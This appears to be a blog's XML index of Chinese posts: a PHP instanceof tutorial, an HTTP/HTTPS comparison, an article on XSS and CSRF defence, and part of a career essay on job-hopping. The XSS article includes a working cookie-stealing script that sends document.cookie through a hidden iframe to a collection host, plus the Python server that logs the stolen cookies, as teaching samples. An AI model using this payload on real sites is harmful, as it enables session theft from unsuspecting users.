<h4 id="第一种用法"><a href="#第一种用法" class="headerlink" title="第一种用法"></a>第一种用法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$obj = <span class="keyword">new</span> A();</div><div class="line"><span class="keyword">if</span> ($obj <span class="keyword">instanceof</span> A) &#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">'A'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="第二种用法"><a href="#第二种用法" class="headerlink" title="第二种用法"></a>第二种用法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ExampleInterface</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">interfaceMethod</span><span class="params">()</span></span>;</div><div class="line"> &#125;</div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">ExampleClass</span> <span class="keyword">implements</span> <span class="title">ExampleInterface</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">interfaceMethod</span><span class="params">()</span></span></div><div class="line">   &#123;</div><div class="line">     <span class="keyword">return</span> <span class="string">'Hello World!'</span>;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line">$exampleInstance = <span class="keyword">new</span> ExampleClass();</div><div class="line"> <span class="keyword">if</span>($exampleInstance <span class="keyword">instanceof</span> ExampleInterface)&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">'Yes, it is'</span>;</div><div class="line"> &#125;<span class="keyword">else</span>&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">'No, it is not'</span>;</div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>输出结果：Yes, it is</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> php </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTP与HTTPS的区别]]></title>
      <url>/2019/03/15/HTTP%E4%B8%8EHTTPS%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      <content type="html"><![CDATA[<p>超文本传输协议HTTP协议被用于在Web浏览器和网站服务器之间传递信息，HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息。</p>
<p>为了解决HTTP协议的这一缺陷，需要使用另一种协议：安全套接字层超文本传输协议HTTPS，为了数据传输的安全，HTTPS在HTTP的基础上加入了SSL/TLS协议，SSL/TLS依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。</p>
<p>HTTPS协议是由SSL/TLS+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全</p>
<p>HTTPS协议的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。</p>
<h2 id="HTTPS和HTTP的区别主要如下："><a href="#HTTPS和HTTP的区别主要如下：" class="headerlink" title="HTTPS和HTTP的区别主要如下："></a>HTTPS和HTTP的区别主要如下：</h2><ul>
<li>1、https协议需要到CA申请证书，一般免费证书较少，因而需要一定费用。</li>
<li>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl/tls加密传输协议。</li>
<li>3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</li>
<li>4、http的连接很简单，是无状态的；HTTPS协议是由SSL/TLS+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</li>
</ul>
<p>客户端在使用HTTPS方式与Web服务器通信时有以下几个步骤，如图所示。</p>
<ul>
<li>客户使用https的URL访问Web服务器，要求与Web服务器建立SSL连接。</li>
<li>Web服务器收到客户端请求后，会将网站的证书信息（证书中包含公钥）传送一份给客户端。</li>
<li>客户端的浏览器与Web服务器开始协商SSL/TLS连接的安全等级，也就是信息加密的等级。</li>
<li>客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。</li>
<li>Web服务器利用自己的私钥解密出会话密钥。</li>
<li>Web服务器利用会话密钥加密与客户端之间的通信。<br><img src="http://imgcdn.95dcw.com/https-1.png" alt="image"><br><img src="http://imgcdn.95dcw.com/https-2.png" alt="image"></li>
</ul>
<p>尽管HTTPS并非绝对安全，掌握根证书的机构、掌握加密算法的组织同样可以进行中间人形式的攻击，但HTTPS仍是现行架构下最安全的解决方案，但他大幅增加了中间人攻击的成本</p>
<h2 id="HTTPS的缺点"><a href="#HTTPS的缺点" class="headerlink" title="HTTPS的缺点"></a>HTTPS的缺点</h2><p>虽然说HTTPS有很大的优势，但其相对来说，还是存在不足之处的：</p>
<ul>
<li>HTTPS协议握手阶段比较费时，会使页面的加载时间延长近50%，增加10%到20%的耗电；</li>
<li>HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗，甚至已有的安全措施也会因此而受到影响；</li>
<li>SSL证书需要钱，功能越强大的证书费用越高，个人网站、小网站没有必要一般不会用。</li>
<li>SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。</li>
<li><p>HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
<p>实践中建议保留http。所以我们在切换的时候可以做http和https的兼容，具体实现方式是，去掉页面链接中的http头部，这样可以自动匹配http头和https头。例如：将<a href="http://www.baidu.com改为//www.baidu.com。然后当用户从http的入口进入访问页面时，页面就是http，如果用户是从https的入口进入访问页面，页面即使https的" target="_blank" rel="external">http://www.baidu.com改为//www.baidu.com。然后当用户从http的入口进入访问页面时，页面就是http，如果用户是从https的入口进入访问页面，页面即使https的</a></p>
</li>
</ul>
<blockquote>
<p>更多详情请查看<a href="https://blog.csdn.net/qq_35642036/article/details/82788421" target="_blank" rel="external">原文</a></p>
</blockquote>
<hr>
<p>作者：Chackca<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/qq_35642036/article/details/82788421" target="_blank" rel="external">https://blog.csdn.net/qq_35642036/article/details/82788421</a> </p>
<hr>
]]></content>
      
        <categories>
            
            <category> php </category>
            
        </categories>
        
        
        <tags>
            
            <tag> http </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS 与 CSRF 两种跨站攻击]]></title>
      <url>/2019/03/15/XSS-%E4%B8%8E-CSRF-%E4%B8%A4%E7%A7%8D%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<hr>
<p>转自：<a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">原文链接</a><br>XSS：跨站脚本（Cross-site scripting）<br>CSRF：跨站请求伪造（Cross-site request forgery）</p>
<hr>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询 已经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要“小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。</p>
<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="string">""</span><span class="string">"</span></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line">"<span class="string">""</span></div><div class="line">import bottle</div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line">@app.route(<span class="string">'/myxss/'</span>)</div><div class="line">def show(cookies, db):</div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    except:</div><div class="line">        pass</div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>然后在某一个页面的评论中注入这段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></div><div class="line">(<span class="function"><span class="keyword">function</span><span class="params">(window, document)</span> </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = document.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + window.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    document.body.appendChild(hideFrame);</div><div class="line">&#125;)(window, document);</div></pre></td></tr></table></figure>
<p>于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。</p>
<p>我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止 XSS 的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。</p>
<p>正如上文所说，如果我们不需要用户输入 HTML 而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果没有使用它们，我们自己也可以这么做。PHP 可以用 htmlspecialchars 函数，Python 可以导入 cgi 模块用其中的 cgi.escape 函数。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。</p>
<p>真正麻烦的是，在一些场合我们要允许用户输入 HTML，又要过滤其中的脚本。Tidy 等 HTML 清理库可以帮忙，但前提是我们小心地使用。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。对于复杂的情况，我个人更倾向于使用简单的方法处理，简单的方法就是白名单重新整理。用户输入的 HTML 可能拥有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML 要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别（前面说了 HTML 不同于 XML，要求有很强的容错性），那么它不会成为漏网之鱼，因为白名单重新整理的策略会直接丢弃掉这些未能识别的部分。最后获得的新 HTML 元素树，我们可以拍胸脯保证——所有的标签、属性都来自白名单，一定不会遗漏。</p>
<p>现在看来，大多数 Web 开发者都了解 XSS 并知道如何防范，往往大型的 XSS 攻击（包括前段时间新浪微博的 XSS 注入）都是由于疏漏。我个人建议在使用模版引擎的 Web 项目中，开启（或不要关闭）类似 Django Template、Jinja2 中“默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似 的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。</p>
<p>另外一个风险集中区域，是富 AJAX 类应用（例如豆瓣网的阿尔法城）。这类应用的风险并不集中在 HTTP 的静态响应内容，所以不是开启模版自动转义能就能一劳永逸的。再加上这类应用往往需要跨域，开发者不得不自己打开危险的大门。这种情况下，站点的安全非常 依赖开发者的细心和应用上线前有效的测试。现在亦有不少开源的 XSS 漏洞测试软件包（似乎有篇文章提到豆瓣网的开发也使用自动化 XSS 测试），但我都没试用过，故不予评价。不管怎么说，我认为从用户输入的地方把好关总是成本最低而又最有效的做法。</p>
<h2 id="CSRF：冒充用户之手"><a href="#CSRF：冒充用户之手" class="headerlink" title="CSRF：冒充用户之手"></a>CSRF：冒充用户之手</h2><p>起初我一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。</p>
<p>CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分 类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。<br>严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。</p>
<p>例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问：</p>
<p><a href="http://example.com/bbs/create_post.php?title=标题&amp;content=内容" target="_blank" rel="external">http://example.com/bbs/create_post.php?title=标题&amp;content=内容</a></p>
<p>那么，我只需要在论坛中发一帖，包含一链接：</p>
<p><a href="http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈" target="_blank" rel="external">http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈</a></p>
<p>只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。</p>
<p>如何解决这个问题，我们是否可以效仿上文应对 XSS 的做法呢？过滤用户输入， 不允许发布这种含有站内操作 URL 的链接。这么做可能会有点用，但阻挡不了 CSRF，因为攻击者可以通过 QQ 或其他网站把这个链接发布上去，为了伪装可能还使用 bit.ly 压缩一下网址，这样点击到这个链接的用户还是一样会中招。所以对待 CSRF ，我们的视角需要和对待 XSS 有所区别。CSRF 并不一定要有站内的输入，因为它并不属于注入攻击，而是请求伪造。被伪造的请求可以是任何来源，而非一定是站内。所以我们唯有一条路可行，就是过滤请求的 处理者。</p>
<p>比较头痛的是，因为请求可以从任何一方发起域，得先 XSS）、Flash 内部发起请求（总是个大隐患）。由于几乎没有彻底杜绝，而发起请求的方式多种多样，可以通过 iframe、ajax（这个不能跨 CSRF 的方式，我们一般的做法，是以各种方式提高攻击的门槛。</p>
<p>首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用 REST 风格 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上——攻击者已经不可能通过发布链接来伪造请求了，但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。</p>
<p>接下来我们就可以用比较简单也比较有效的方法来防御 CSRF，这个方法就是“请求令牌”。读过《J2EE 核心模式》的同学应该对“同步令牌”应该不会陌生，“请求令牌”和“同步令牌”原理是一样的，只不过目的不同，后者是为了解决 POST 请求重复提交问题，前者是为了保证收到的请求一定来自预期的页面。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token）， 保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登陆验证身份。</p>
<blockquote>
<p>请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。使用请求令牌来防止 CSRF 有以下几点要注意：</p>
</blockquote>
<ul>
<li><p>虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 Session Key，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key 中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。</p>
</li>
<li><p>在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。</p>
</li>
<li><p>第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。</p>
</li>
<li><p>无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个 问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到 Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。</p>
</li>
</ul>
<p>如下也列出一些据说能有效防范 CSRF，其实效果甚微的方式甚至无效的做法。</p>
<ul>
<li><p>通过 referer 判定来源页面：referer 是在 HTTP Request Head 里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer 任何值。当然这个做法并不是毫无作用，起码可以防小白。但我觉得性价比不如令牌。</p>
</li>
<li><p>过滤所有用户发布的链接：这个是最无效的做法，因为首先攻击者不一定要从站内发起请求（上面提到过了），而且就算从站内发起请求，途径也远远不知链接一条。比如  <code>php &lt;img src=&quot;./create_post.php&quot; /&gt;</code> 就是个不错的选择，还不需要用户去点击，只要用户的浏览器会自动加载图片，就会自动发起请求。 *在请求发起页面用 alert 弹窗提醒用户：这个方法看上去能干扰站外通过 iframe 发起的 CSRF，但攻击者也可以考虑用 window.alert = function(){}; 把 alert 弄哑，或者干脆脱离 iframe，使用 Flash 来达到目的。</p>
</li>
</ul>
<p>总体来说，目前防御 CSRF 的诸多方法还没几个能彻底无解的。所以 CSDN 上看到讨论 CSRF 的文章，一般都会含有“无耻”二字来形容（另一位有该名号的貌似是 DDOS 攻击）。作为开发者，我们能做的就是尽量提高破解难度。当破解难度达到一定程度，网站就逼近于绝对安全的位置了（虽然不能到达）。上述请求令牌方法，就我 认为是最有可扩展性的，因为其原理和 CSRF 原理是相克的。CSRF 难以防御之处就在于对服务器端来说，伪造的请求和正常的请求本质上是一致的。而请求令牌的方法，则是揪出这种请求上的唯一区别——来源页面不同。我们还可 以做进一步的工作，例如让页面中 token 的 key 动态化，进一步提高攻击者的门槛。本文只是我个人认识的一个总结，便不讨论过深了。</p>
]]></content>
      
        <categories>
            
            <category> php </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[我用24次离职，换来6条血一样的教训]]></title>
      <url>/2019/03/12/%E6%88%91%E7%94%A824%E6%AC%A1%E7%A6%BB%E8%81%8C%EF%BC%8C%E6%8D%A2%E6%9D%A56%E6%9D%A1%E8%A1%80%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%99%E8%AE%AD/</url>
      <content type="html"><![CDATA[<hr>
<p>作者丨周冲<br>来源丨周冲的影像声色<br><a href="https://blog.csdn.net/UW63ZqpKxwlRL1/article/details/88374015" target="_blank" rel="external">原文链接</a></p>
<hr>
<p>我是2014年毕业的。</p>
<p>毕业之后，以为年轻，有的是任性资本，也有的是发展可能，结果频繁跳槽，稍有不顺就辞职。</p>
<p>毕业5年跳槽了24次。</p>
<p>最短一次，只做了半天。最长一次，也不过4个月。</p>
<p>可是，辞职一时爽，职业生涯成了火葬场。</p>
<p>到现在为止，我已经30岁了，一无所成，再去求职，已经没有公司要了。</p>
<p>今年年初，在各大招聘网站上发了几十轮简介，结果只有1个电话面试。</p>
<p>电话里，HR问：“为什么你这些年跳槽这么勤？”</p>
<p>我说：“可能还是没有找到合适的岗位。”</p>
<p>人家一听，委婉地挂掉了电话。再无回音。</p>
<p>后来想求朋友介绍工作。</p>
<p>但因为自己太动荡，翻了一下电话薄，发现根本没有人脉厉害、资源丰富的朋友。</p>
<p>做兼职，人家只要自带技能、专业本领过硬的人，我？算了吧，这些年根本没有静下心好好学东西，根本找不到这样的工作。</p>
<p>做体力活？服务行业？对不起，吃不了苦。</p>
<p>就这样，我已在破旧的出租屋里呆了几个月，不知何去何从。</p>
<p>甚至有一度我想过求从前的领导与BOSS重新接纳，申请一发出，“XX已经开启了好友验证，你还不是他朋友……”</p>
<p>作为一个自毁前程的人，我想以自己作为反面案例，告诉所有冲动的、天真的、任性的、对职场一无所知的、抱着粉色幻想的、唯我独尊的职场人 6 条泣血建议。</p>
<p>希望你们每一个人，都能好好看完，千万不要像我，非要踏进这些坑。</p>
<h2 id="01-动则离职真的死得快"><a href="#01-动则离职真的死得快" class="headerlink" title="01 动则离职真的死得快"></a>01 动则离职真的死得快</h2><p>如果你是一个90后，你一定要克服自己这个愚蠢的念头：我还年轻，有的是时间。</p>
<p>事实上，我们的时间真的很少。</p>
<p>我听一些HR说，现在来求职的人，哪怕90年生的，都会被排除在外，因为近30了，磨合成本高，对方要价也更高，不划算。</p>
<p>尤其是女性，因为各种保护，企业动不得，辞不得，用人单位本来就慎重，职业年龄更短。</p>
<p>一旦过了25岁，在职场上就开始变得尴尬。</p>
<p>你去求职，别人会非常委婉地打听你的婚恋情况。然后就没有然后了。</p>
<p>也就是说，我们只有短短几年的黄金求职年龄。这段时间过去了，在职场上就不再有年龄优势。</p>
<p>而频繁辞职，你也很难学到一个行业的真本事。</p>
<p>之前我一个老板说过，如果你想了解一个行业的精髓，必须要在这个行业呆上5年以上。</p>
<p>我5年是呆了5年，只不过在24个地方呆了5年。</p>
<p>这就导致我永远在面试。</p>
<p>永远在试用。</p>
<p>永远在被拒绝。</p>
<p>能学到本事？怎么可能！</p>
<p>我现在窘迫到连叫一份8块钱的外卖，都能分成两顿吃。在淘宝买衣服，都只敢买30块以下的，并且一穿就是一年。</p>
<p>说到淘宝，忽然想起有外媒曾经问马爸爸：“对当下年轻人频繁辞职，你怎么看。”</p>
<p>马爸爸说了一番话，我觉得大家都该好好听。</p>
<p>他说，不要频繁辞职。</p>
<p>他第一份工作是做老师，并不是自己真正热爱的，但因为一个院长在他毕业时对他说：答应我，干满6年。</p>
<p>他信守承诺，做满了6年才开始创业。</p>
<p>而这6年里，他慢慢发现教师这份工作的乐趣。</p>
<p>面对当下年轻人的辞职瘾，他说：“你要在内心深处，给自己一个承诺，这份工作，我至少要做满3年才走。”</p>
<p>640?wx_fmt=gif</p>
<p>“很多人啊，跳来跳去，这真的不好。”</p>
<p>640?wx_fmt=gif</p>
<p>“通常情况下，20-30岁的年轻人，对自己的未来没有方向，脑子里有很多想法，觉得自己啥事都能做好，事实上啥事儿也做不好。”</p>
<p>640?wx_fmt=gif</p>
<p>“你要跟着一个好老板，将一份工作，坚持做下去。”</p>
<p>640?wx_fmt=gif</p>
<p>“就专注于眼前，将你最擅长的事情做好。”</p>
<p>640?wx_fmt=gif</p>
<p>唉，我是真的到现在，才明白马爸爸的话中真谛。</p>
<h2 id="02-情绪一定要稳定"><a href="#02-情绪一定要稳定" class="headerlink" title="02 情绪一定要稳定"></a>02 情绪一定要稳定</h2><p>我最后悔的一次，是从一家新媒体公司辞职。</p>
<p>因为行业好，公司里每个人的收入都很高。</p>
<p>在那里，我本来月薪都过万了。</p>
<p>但也是因为矫情，觉得公司看不见我的郁闷，老板对我不信任，加上做错了事，被记了一次小过，扣了100块钱，一气之下，又辞了职。</p>
<p>此后就再没有找到那么好的公司。</p>
<p>后来反思自己的失败，发现情绪过于冲动，是我最大的致命伤。</p>
<p>我一直天真地以为，在工作中受了气，就是公司的错，就是领导的错，就是制度的错。</p>
<p>但我没想过，这些情绪的解决者，都不是别人，而应该是我自己。</p>
<p>我没有想过去主动沟通。</p>
<p>更没想过去积极解决。</p>
<p>而是任由情绪发酵，导致自己天天吹毛求疵，莫名其妙，内心戏十足，越来越陷入“受害者心理”中，天天板着个脸，觉得全世界都欠了我一样。</p>
<p>最终，老板再大度，也忍无可忍了。</p>
<p>而我只有主动离职。</p>
<p>情绪稳定，是职场最基本的情商。</p>
<p>毕竟公司不是心理咨询室。</p>
<p>不是育婴室。</p>
<p>无法负责我的郁闷与烦躁，也不会360地伺候好我的喜怒哀乐。</p>
<p>所有情绪，我都必须学会自己处理。</p>
<p>我们都是一个成年人。</p>
<p>一个成年人最大的标志，就是自我负责。</p>
<p>这种自我负责，不仅包括负责自己的前途、收入、发展、成长，还包括负责自己的情绪，没有任何人有义务保护我们的玻璃心。除了我们自己。</p>
<h2 id="03-一定要靠谱"><a href="#03-一定要靠谱" class="headerlink" title="03 一定要靠谱"></a>03 一定要靠谱</h2><p>所谓靠谱，就像我们所熟知的那样，“凡事有交代，件件有着落，事事有回音。”</p>
<p>每一个公司都有自己的运营机制。</p>
<p>但有一点，都是一样的。那就是领导都希望能尽量减少沟通成本，让公司的合作都高效起来，顺利起来，每个环节都清楚而明朗。</p>
<p>所以交代给你的事情，一定要做到都有反馈，有复盘，有总结，有改进方案。</p>
<p>我有一个同学就是凭着这种劲头，迅速获得了认可和加薪。</p>
<p>公司交给她一个项目，没有说期限、汇报对象、绩效指标。</p>
<p>但她在接到之后，迅速制定一个执行方案。</p>
<p>方案中，不仅包括了达成目标、实操步骤、裂变方式和合作方，还包括了时间期限和利润预算。</p>
<p>她的主管都惊了。</p>
<p>而在跟这个项目时，她每天晚上哪怕再累，都会仔细地汇报进程。</p>
<p>即使没有完成，也将困难如实告诉领导，虚心请教他的帮助。</p>
